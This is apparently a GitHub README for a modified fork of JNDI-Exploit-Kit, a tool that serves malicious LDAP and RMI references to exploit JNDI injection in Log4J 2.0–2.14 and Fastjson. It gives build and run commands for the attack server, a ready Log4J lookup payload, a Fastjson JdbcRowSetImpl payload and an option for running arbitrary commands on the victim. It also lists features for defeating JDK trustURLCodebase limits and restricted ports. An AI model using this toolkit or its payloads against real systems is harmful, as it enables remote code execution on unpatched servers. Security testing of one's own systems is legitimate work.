
# JNDI-Exploit-Kit

## Disclaimer #3
This is a modified version of https://github.com/pimps/JNDI-Exploit-Kit. I'm not familiar with git, and I just want to try injecting a program that prints "HelloWorld" on the victim's computer without interfering with the existing project so I made a copy instead of clone/fork. All credit belong to @pimps.

It was very confusing in the beginning when the ExecTemplateJDK8.class doesn't do anything, while Log4J app prints out an error
```java
javax.naming.NamingException: problem generating object using object factory [Root exception is java.lang.ClassCastException: HelloWorld cannot be cast to javax.naming.spi.ObjectFactory]; 
```

leaving me wondering whether something has gone wrong. So I'm modifying a bit to remove the unnecessary complexity and allow adding Java code directly to programmer can write whatever Java code they want for their test. 

You can now write your own java class inside folder **src/main/java/malicious**, then attack the application through Log4J using this URL:
>ldap://127.0.0.1:1389/YourMaliciousClassName

Note: the class must not have a package or it doesn't work.

Building and running is the same as before:
```shell
mvn clean package -DskipTests
java -jar target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 127.0.0.1:1389
```
Then just fire a separate Java program with log4j 2.0 -> 2.14 with the following log:
```java
logger.info("${jndi:ldap://127.0.0.1:1389/HelloWorld}");
```

## =========== CONTENT FROM ORIGINAL# 2 PROJECT ==============

## Disclaimer

This is a forked modified version of the great exploitation tool created by @welk1n (https://github.com/welk1n/JNDI-Injection-Exploit). Here is what I've updated on his tool:

- Added support to serialized java payloads to LDAP payloads. This allows exploitation of any java version as long the classes are present in the application classpath ignoring completely the trustURLCodebase=false.
- Added a proper menu with a help display and guidelines (and a fancy ascii banner just because :-p)
- Added some command line parameters to modify IP:PORT of the services. This helps on situations where the target can only access specific ports like 25, 53, 80, 443, etc. 
- Added standalone mode to all services, that way you can start only the JettyServer (HTTP), RMIServer or LDAPServer. The HTTP address can also be changed on standalone mode to redirect requests to a different server. This is helpful in cases when the target can only access a single port (like the port 53) and you need jump across multiple servers in the port 53 for successful exploitation.
- Modified the ASMified Transformer payload (java bytecode) to detect the operational system where the exploit code will be detonated (windows or unix like systems) and automatically runs the command into a proper terminal shell using the command Runtime.getRuntime().exec(String[] cmd) automatically mapping it to "cmd.exe /c command" or "/bin/bash -c command". That way we can control pipes and write output to files, etc.
- Added the JNDI bypass using groove published by @orangetw
- Modified the Expression Language in the EL bypass to a more concise payload that detects the operational system and runs the command in a proper terminal (similar to the modified ASMified Transformer code).
- Added two more JDK templates, JDK 1.6 and JDK 1.5. This is important in case of legacy systems that have ancient Java versions.

    Screenshots:
   ![image-20191018154346759](https://github.com/pimps/JNDI-Injection-Exploit/blob/master/screenshots/modified_new.png)

   ![image-20191018154346759](https://github.com/pimps/JNDI-Injection-Exploit/blob/master/screenshots/modified.png)

   ![image-20191018154346759](https://github.com/pimps/JNDI-Injection-Exploit/blob/master/screenshots/modified2.png)
   
   POC Video:
   
   [![Video](http://img.youtube.com/vi/yzTxy2N7dBo/0.jpg)](https://www.youtube.com/watch?v=yzTxy2N7dBo "Liferay 6.x RCE via JSON Deserialization -> JNDI Injection")

Download of compiled version: https://github.com/pimps/JNDI-Exploit-Kit/raw/master/target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar





## =========== CONTENT FROM ORIGINAL PROJECT ==============

[Materials about JNDI Injection](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)

## Description

JNDI-Injection-Exploit is a tool for generating workable JNDI links and provide background services by starting RMI server,LDAP server and HTTP server. RMI server and LDAP server are based on  [marshals](https://github.com/mbechler/marshalsec) and modified further to link with HTTP server. 

Using this tool allows you get JNDI links, you can insert these links into your **POC** to test vulnerability. 

For example, this is a Fastjson vul-poc:

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/Object","autoCommit":true}
```

We can replace  "rmi://127.0.0.1:1099/Object" with the link generated by JNDI-Injection-Exploit to test vulnerability. 

## Disclaimer

All information and code is provided solely for educational purposes and/or testing your own systems for these vulnerabilities.

## Usage

 Run as

```shell
$ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [command] [-A] [address]
```

where:

- **-C** - command executed in the remote classfile.

  (optional , default command is "open /Applications/Calculator.app")

- **-A** - the address of your server, maybe an IP address or a domain.

  (optional , default address is the first network interface address)

Points for attention:

- make sure your server's ports (**1099**, **1389**, **8180**) are available .

  or you can change the default port in the run.ServerStart class line 26~28.

- your command is passed to **Runtime.getRuntime().exec()** as parameters, 

  so you need to ensure your command is workable in method exec().
  
  **Command in bash like "bash -c ...." need to add Double quotes.**

## Examples

 Local demo:

1. Start the tool like this:

   ```shell
   $ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "open /Applications/Calculator.app" -A "127.0.0.1"
   ```

    Screenshot:

   ![image-20191018154346759](https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/screenshots/1.png)

2. Assume that we inject the JNDI links like rmi://ADDRESS/jfxllc generated in step 1 to a vulnerable application which can be attacked by JNDI injection.

   In this example, it looks like this:

   ```java
   public static void main(String[] args) throws Exception{
       InitialContext ctx = new InitialContext();
       ctx.lookup("rmi://127.0.0.1/fgf4fp");
   }
   ```

   then when we run this code, the command will be executed ,

   and the log will be printed in shell:

   ![image-20191018154515787](https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/screenshots/2.png)



## Installation

We can select one of the two methods to get the jar.

1. Download the latest jar from [Realease](https://github.com/welk1n/JNDI-Injection-Exploit/releases/download/v1.0/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar).

2. Clone the source code to local and build (Requires Java 1.8+ and Maven 3.x+).

   ```shell
   $ git clone https://github.com/welk1n/JNDI-Injection-Exploit.git
   ```

   ```shell
   $ cd JNDI-Injection-Exploit
   ```

   ```shell
   $ mvn clean package -DskipTests
   ```

## To do

- (**Done**)Combine this project and [JNDI-Injection-Bypass](https://github.com/welk1n/JNDI-Injection-Bypass) to generate workable links when **trustURLCodebase is false** in higher versions of JDK by default.
- â€¦ ...
